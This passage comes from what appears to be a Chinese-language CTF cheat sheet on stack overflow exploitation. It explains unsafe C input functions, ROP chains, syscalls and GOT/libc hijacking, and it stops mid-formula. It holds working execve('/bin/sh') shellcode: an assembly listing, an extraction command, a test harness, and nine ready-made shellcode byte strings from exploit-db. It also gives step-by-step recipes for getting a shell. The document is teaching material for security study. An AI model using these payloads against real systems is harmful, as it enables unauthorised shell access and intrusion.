class="comment">// gets可以读取空格</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">gets</span><span class="params">(<span class="keyword">char</span> *str)</span></span>;</span><br><span class="line"><span class="comment">// str: 要写入位置的指针</span></span><br><span class="line"><span class="comment">// 若读取成功返回写入位置的指针，否则返回空指针</span></span><br></pre></td></tr></table></figure></li><li><p>scanf</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从标准输入缓冲区中读取符合格式的字符串，遇到空格停止读取</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">scanf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="comment">// format: 格式化字符串</span></span><br><span class="line"><span class="comment">// ...: 需要被格式化到format的参数</span></span><br><span class="line"><span class="comment">// 若读取成功，返回匹配和赋值的个数，否则返回EOF</span></span><br></pre></td></tr></table></figure></li><li><p>strcpy/strncopy/memcpy</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从原指针指向的位置读取指定数量字节写入到目标指针的位置</span></span><br><span class="line"><span class="comment">// strcpy/strncpy只支持字符串的复制，memcpy可以复制任何内容</span></span><br><span class="line"><span class="comment">// strcpy函数读取到\0为止，会将\0复制到目标位置，而strncpy不会添加\0，若src的长度小于n字节则用\0填充</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">strcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memcpy</span><span class="params">( <span class="keyword">void</span> *dest, <span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">size_t</span> count )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strncpy</span><span class="params">(<span class="keyword">char</span> *dest,<span class="keyword">char</span> *src,<span class="keyword">int</span> <span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="comment">// dest: 要写入的位置的指针</span></span><br><span class="line"><span class="comment">// src: 原位置的指针</span></span><br><span class="line"><span class="comment">// count/n: 要写入的字节数</span></span><br><span class="line"><span class="comment">// 若复制成功返回目标位置的指针，否则返回空指针</span></span><br></pre></td></tr></table></figure></li><li><p>strcat</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将src添加到dest的末尾，删除dest末尾的\0，连同src中的\0一起复制到dest的末尾</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;</span><br><span class="line"><span class="comment">// dest: 目标字符串的指针</span></span><br><span class="line"><span class="comment">// src: 要追加的字符串的指针</span></span><br><span class="line"><span class="comment">// 返回指向dest的指针</span></span><br></pre></td></tr></table></figure></li></ul><p>栈溢出寻找方法</p><ol><li><p>在函数中寻找类似于buf的局部变量</p></li><li><p>在函数中找到向该buf写入数据的函数</p></li><li><p>检查可写入的最大大小是否能够超过buf定义大小</p></li><li><p>若可以溢出，则查看buf在栈中的位置，寻找buf之后是否有其他局部变量，或者是否可以溢出到ret</p></li><li><p>计算出buf到达目标的总长度，进行溢出，目标可以是ret，buf之后的其他局部变量或者bss段上的某些全局变量</p></li></ol><p>基本套路</p><ol><li>检查程序的防护措施与运行平台</li><li>是静态编译还是动态编译</li><li>找到溢出点并且想办法劫持程序流程</li><li>静态编译会提供大量的gadgets，需要利用ROP跳转到shellcode或者拼凑出系统调用</li><li>动态编译则需要想办法泄漏出一个libc中的地址，最后利用libc中的system执行命令</li><li>拿到libc的地址以后找到对应版本的libc（如果题目没有提供libc）</li><li>计算出libc的基地址，进而计算出system的地址</li><li>跳转到system从而getshell</li></ol><p>其实栈溢出的目的就是劫持控制流，也就是控制eip寄存器，而eip寄存器又何esp，ebp息息相关，如果可以在ret指令之前控制esp的话，甚至不用覆盖ret也可以劫持控制流，或者如果控制ebp的话甚至可以控制栈低后面的ret。</p><h1 id="0x4-ROP"><a href="#0x4-ROP" class="headerlink" title="0x4 ROP"></a>0x4 ROP</h1><p>ROP即Return-Oriented programming（面向返回编程），其最大的作用就是可以绕过多种安全保护措施，并且可以帮助我们Getshell。ROP是指利用程序中碎小的代码片段来操作寄存器，甚至改变程序流程的技术，这些小的代码片段被称为gadgets。一个gadget通常是以ret或者jmp等跳转指令结尾的代码片段，最常用的是以ret结尾，ret指令可以从栈顶弹出一个值到eip中，控制程序下一条指令的地址，如果我们可以控制栈上的元素，就可以利用多个gadgets形成ROP链，不过需要事先得知每个gadget的地址。</p><p>通常使用静态编译的程序中会包含大量可用的gadgets，动态编译的程序中也含有少量可以使用的gadgets，收集到足够多的gadgets以后就可以修改寄存器的值并且控制程序的流程。利用多个gadgets修改寄存器以后可以直接调用syscall，也可以直接跳转到写入内存中的shellcode的地址，或者跳转到libc中可以执行系统命令函数的地址。</p><p>ROP技术需要有一定汇编指令的基础，并且关键在于如何合理组合各种gadgets形成完美的ROP链。ROP链首先需要从栈溢出修改返回地址开始，最后结束于各种可以getshell的方式。一个简单的ROP示例如下，假设目前已经在程序中找到了一个可用的ROP链，这里以64位为例，并且最终目的是调用execve的系统调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Gadgets:</span><br><span class="line">    0x400686 : pop rdi ; ret</span><br><span class="line">    0x4101f3 : pop rsi ; ret</span><br><span class="line">    0x4498b5 : pop rdx ; ret</span><br><span class="line">    0x415664 : pop rax ; ret</span><br><span class="line">    0x40129c : syscall</span><br></pre></td></tr></table></figure><p>ROP的目的就是在程序中需找大量可以控制寄存器与程序流程的汇编指令，例如各种pop指令，call指令与jmp指令，并且将这些指令通过栈串联起来，此外如果程序中没有合适的指令，也可以通过指令偏移构造合适的指令（不同的机器码解析出的指令也不同）。</p><p>栈溢出发生后栈中情况如下图所示，其中addr_of_bin_sh代表字符串<code>/bin/sh</code>的地址。execve的系统调用需要3个参数，第一个参数是需要执行的系统命令的字符串，第二个参数是该命令的参数，第三个参数为该命令的环境变量，通常第一个参数为字符串<code>/bin/sh</code>，第二第三个参数均为0，代表空。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/6.png"></p><h1 id="0x5-系统调用"><a href="#0x5-系统调用" class="headerlink" title="0x5 系统调用"></a>0x5 系统调用</h1><p>Getshell的方式之一。系统调用是为了用户空间与系统内核空间进行交互所提供的一组接口，在用户空间运行的程序通过syscall向内核发送请求，内核收到请求后负责执行，请求的参数一般通过寄存器传递，最后通过软中断使程序进入内核态执行对应操作。在32位系统下使用<code>int 0x80</code>指令启动系统调用，64位系统下使用 <code>syscall</code>指令。一般通过ROP构造系统调用，构造系统调用的过程如上节所示。常用的系统调用如下，更多的系统调用参数请参考<code>Syscall CheatSheet</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="0x6-Shellcode"><a href="#0x6-Shellcode" class="headerlink" title="0x6 Shellcode"></a>0x6 Shellcode</h1><p>Getshell的方式之一，主要通过execve系统调用执行命令。shellcode是一组机器码，一般通过直接编写汇编语言后生成机器码，之后通过栈溢出将shellcode写入某个具有可执行权限的地址以后跳转到shellcode的地址即可执行shellcode。</p><p>shellcode通常越少越好，另外shellcode中需要避免出现坏字符<code>\x00</code>，坏字符会导致shellcode写入目标地址时发生截断，如果shellcode中需要用到数字0，可以利用其它方式获取，例如<code>xor eax eax</code>即可将eax置0，此外在shellcode中操作立即数时，应该根据立即数的大小尽量选择合适的寄存器，例如<code>mov al, 0x1</code>要比<code>mov rax, 0x1</code>更好，后者会使shellcode变得更长，也可能会使shellcode中出现坏字符。</p><p>execve的第一个参数也就是要执行的命令，一般都会是<code>/bin/sh</code>，如果该字符串被保存在栈中时，由于栈是从高地址向低地址生长，因此字符串也应该反向写入栈中，另外为了内存对齐，字符串的长度需要为机器字长的倍数，所以采用<code>//bin/sh</code>。若出于某种原因，shellcode中无法使用栈（不能利用pop与push指令），可以先利用write或者read系统调用将字符串<code>/bin/sh</code>写入某个内存中的地方。若在shellcode执行的上下文环境中没有合适的地址，可以先执行一次read系统调用，部分系统调用结束以后会改变某些寄存器的值为某个地址。</p><p>编写shellcode的方法如下。</p><ol><li><p>编写对应的汇编代码（以32位机器为例）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; eax&#x3D;11 ebx&#x3D;&quot;&#x2F;&#x2F;bin&#x2F;sh&quot; ecx&#x3D;[&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;, NULL] edx&#x3D;NULL</span><br><span class="line"></span><br><span class="line">    xor eax, eax  ; Get zero</span><br><span class="line"></span><br><span class="line">    ; The first arg</span><br><span class="line">    push eax  ; The string ending \x00</span><br><span class="line">    push 0x68732f6e</span><br><span class="line">    push 0x69622f2f  ; &quot;&#x2F;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">    mov ebx, esp  ; ebx&#x3D;&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line"></span><br><span class="line">    ; NULL at argv[1]</span><br><span class="line">    push eax </span><br><span class="line">    mov edx, esp  ; edx&#x3D;NULL</span><br><span class="line"></span><br><span class="line">    ; Address of &quot;&#x2F;&#x2F;bin&#x2F;sh&quot; at argv[0]</span><br><span class="line">    push ebx</span><br><span class="line">    mov ecx, esp  ;ecx&#x3D;[&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;, NULL]</span><br><span class="line"></span><br><span class="line">    ; Call execve</span><br><span class="line">    mov al, 11</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure></li><li><p>汇编</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 shell.asm</span><br></pre></td></tr></table></figure></li><li><p>提取shellcode并检查是否出现<code>\x00</code></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./shell |grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|cut -f2 -d:|cut -f1-6 -d<span class="string">&#x27; &#x27;</span>|tr -s <span class="string">&#x27; &#x27;</span>|tr <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s/ /\\x/g&#x27;</span>|paste -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>优化shellcode</p></li><li><p>测试shellcode</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -fno-stack-protector -z norelro -no-pie -z execstack shellcode.c -o shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> (*func)();</span><br><span class="line">    func = (<span class="keyword">int</span> (*)()) shellcode;</span><br><span class="line">    (<span class="keyword">int</span>)(*func)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>这里提供了一些可用的shellcode（来自<a href="www.exploit-db.com">exploit-db</a>）</p><ol><li><p>前文shellcode（x86，25 bytes）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax  ; Get zero</span><br><span class="line">push eax  ; The string ending \x00</span><br><span class="line">push 0x68732f6e</span><br><span class="line">push 0x69622f2f  ; &quot;&#x2F;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">mov ebx, esp  ; ebx&#x3D;&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line"></span><br><span class="line">; NULL at argv[1]</span><br><span class="line">push eax </span><br><span class="line">mov edx, esp  ; edx&#x3D;NULL</span><br><span class="line"></span><br><span class="line">; Address of &quot;&#x2F;&#x2F;bin&#x2F;sh&quot; at argv[0]</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp  ;ecx&#x3D;[&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;, NULL]</span><br><span class="line"></span><br><span class="line">; Call execve</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></li><li><p>execve（x86，18 bytes）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">push   0xb</span><br><span class="line">pop    eax</span><br><span class="line">push   ebx</span><br><span class="line">push   0x68732f2f</span><br><span class="line">push   0x6e69622f</span><br><span class="line">mov    ebx,esp</span><br><span class="line">int    0x80</span><br></pre></td></tr></table></figure></li><li><p>execve（x86，19 bytes）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">xchg ebx, esp</span><br><span class="line">mov al, 0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></li><li><p>execve（x86，24 bytes）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx, esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">mov al, 0x0b</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，21 bytes）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rdi, &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，23 bytes）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xor rsi, rsi</span><br><span class="line">push rsi</span><br><span class="line">mov rdi, 0x68732f2f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，24 bytes）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rsi, rsi</span><br><span class="line">mov rbx, &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，30 bytes）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">mov rcx, 0x1168732f6e69622f ;move the immediate value &#x2F;bin&#x2F;sh in hex in </span><br><span class="line">;little endian byte order into rcx padded with 11</span><br><span class="line">shl rcx, 0x08               ;left shift to trim off the two bytes of padding    </span><br><span class="line">shr rcx, 0x08               ;ringht shift to re order string</span><br><span class="line">push rcx                    ;push the immediate value stored in rcx onto the stack</span><br><span class="line">lea rdi, [rsp]              ;load the address of the string that is on the stack into rsi</span><br><span class="line">xor rdx, rdx                ;zero out rdx for an execve argument</span><br><span class="line">mov al, 0x3b                ;move 0x3b (execve sycall) into al to avoid nulls</span><br><span class="line">syscall                     ;make the syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，31 bytes）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xor rdi, rdi</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rax, rax</span><br><span class="line">push rax</span><br><span class="line">; 68 73 2f 2f 6e 69 62 2f</span><br><span class="line">mov rbx, 68732f2f6e69622fH</span><br><span class="line">push rbx</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li></ol><h1 id="0x7-Libc"><a href="#0x7-Libc" class="headerlink" title="0x7 Libc"></a>0x7 Libc</h1><p>Getshell的方式之一。libc是Linux下的一组标准函数库，包含了C语言最基本的函数。当程序采用动态链接时，在加载程序的时候会将指定的libc链接到程序，若未指定则使用操作系统当前的libc，这样程序中才可以调用libc中提供的外部函数。当操作系统为程序加载完成libc以后，程序中需要调用的外部函数就会被放在内存中，libc中的每个函数地址都是一个偏移量，程序加载libc以后确定了libc的基地址，再加上libc中函数的偏移量就可以得到libc中函数在内存中的真实地址，当程序调用libc中的外部函数时，会通过plt表与got表跳转到该函数。</p><ul><li><p>PLT表(Procedure Linkage Table, 程序链接表，.plt段)</p><p>  用来存储程序中使用的外部函数的入口，也就是got表中对应的条目。位于代码段，编译时确定，没有写权限，无法修改。</p><p>  plt表中第一项的作用就是跳转到_dl_runtime_resolve函数，函数原型为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，该函数可以动态解析函数地址并且写入到got表中，最后还会调用被解析的函数。该条目一般由两条指令构成，第一条指令是push一个值到栈中，该值为_dl_runtime_resolve的第一个参数link_map_obj，也就是got表中的第一项，第二条指令是跳转到_dl_runtime_resolve函数的地址，调用该函数，也就是got表中的第二项。</p><p>  其余plt表项一般由3条指令构成，第一条指令跳转到对应的got表条目中存储的地址，第二条指令是push一个值到栈中，该值就是_dl_runtime_resolve的第二个参数reloc_index，第三条指令就是跳转到plt表的第一项，也就是调用动态链接器解析函数地址。plt表的结构如下所示。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">plt[0]:</span><br><span class="line">push got[1]</span><br><span class="line">jmp got[2]</span><br><span class="line">func@plt:</span><br><span class="line">jmp func@got</span><br><span class="line">push func_index</span><br><span class="line">jmp plt[0]</span><br><span class="line">otherfunc@plt:</span><br><span class="line">jmp otherfunc@got</span><br><span class="line">push otherfunc_index</span><br><span class="line">jmp plt[0]</span><br><span class="line">anotherfunc@plt:</span><br><span class="line">jmp anotherfunc@got</span><br><span class="line">push anotherfunc_index</span><br><span class="line">jmp plt[0]</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>GOT表(Global Offset Table, 全局偏移表，.got.plt段)</p><p>  用来存储外部函数在内存中的地址，plt表与got表中的条目是一一对应的。位于数据段，可以动态修改，具有写权限。got表就是一个函数指针数组，其中got表的第一项got[0]是程序动态段(.dynamic)的装载地址，该段中保存了所有程序中需要使用的外部函数，got表的第二项got[1]是link_map_object的地址，也就是_dl_runtime_resolve的第一个参数，got表第三项got[2]是_dl_runtime_resolve函数的地址，其余条目为外部函数的地址，与plt表相对应，plt表与got表都对应关系如下所示。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">           got[0] ---&gt; .dynamic address</span><br><span class="line">       |-&gt; got[1] ---&gt; link_map_object address</span><br><span class="line">plt[0] --&gt; got[2] ---&gt; _dl_runtime_resolve address</span><br><span class="line"></span><br><span class="line">plt[1] --&gt; got[3]</span><br><span class="line">plt[2] --&gt; got[4]</span><br><span class="line">plt[3] --&gt; got[5]</span><br><span class="line">...        ...</span><br></pre></td></tr></table></figure></li></ul><p>当程序使用动态链接时，采用一种被称为延迟绑定的技术以提高程序执行效率。虽然got表的作用是存储所有外部函数的地址，但是当程序刚开始运行时初始got表中所有的条目都指向plt表中对应的条目（即对应plt条目中的第二条指令push），而plt表中对应条目的作用除了跳转到got表中对应条目存储的地址，另外就是解析并且绑定该外部函数的地址，也就是说当程序第一次调用某个外部函数时，该函数的地址才会被解析并且写入到got表中，以后每次调用都会直接通过got表跳转到对应地址而不用重新解析地址。调用外部函数的过程如下所示。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/7.png"></p><ol><li>首先程序中第一次调用外部函数func，跳转到func@plt中</li><li>执行func@plt表中第一条指令，跳转到func@got</li><li>由于这是第一次调用func，所以func@got表中存储的是func@plt中的第二条指令地址，也就是func@plt+6</li><li>跳转到plt[0]准备执行_dl_runtime_resolve</li><li>执行_dl_runtime_resolve，并且修改对应的func@got表条目地址为真正的func地址，并且跳转到func函数的地址执行</li><li>第二次调用func函数，跳转到func@plt中</li><li>func@plt再跳转到func@got中</li><li>由于func@got已经被修改为func的真正地址，所以就可以直接跳转到func函数的地址执行，并且以后调用func函数时都可以直接执行，无需重新解析地址</li></ol><p>针对libc的利用主要是通过修改got表中的条目来控制执行流程，称为got表劫持（当然如果程序中有libc中的system函数调用就可以直接跳转到system@plt，不过一般很少出现这种情况）。前面已经知道got表就是一个函数指针数组，并且可写，所以只想办法获取system函数在加载到程序中的libc中的地址，就可以修改got表中某个函数的地址为system函数的地址，例如修改puts函数的地址，修改完成后以后每次调用puts都相当于调用system函数。</p><p>由于got表中只存储了程序中使用到的外部函数的地址，所以没有办法直接获取到system函数地址，但是如果知道程序使用的libc，就可以知道system函数在libc中的地址偏移，之后再从程序中想办法拿到libc的基地址，两者相加就可以知道system函数在程序中的真实地址。</p><p>一般的套路是想办法从程序中泄漏出一个libc库函数中某个函数的地址，例如puts函数。拿到puts函数的地址以后，由于libc的基地址低12位（低3个十六进制数）都是0，所以只需要函数地址的低12位（3个十六进制数）就可以通过偏移确定出程序使用libc版本，拿到libc以后就可以知道system函数与puts函数在libc中的偏移，计算出system函数地址的公式为<code>system地址 = puts地址 - pus偏移 + 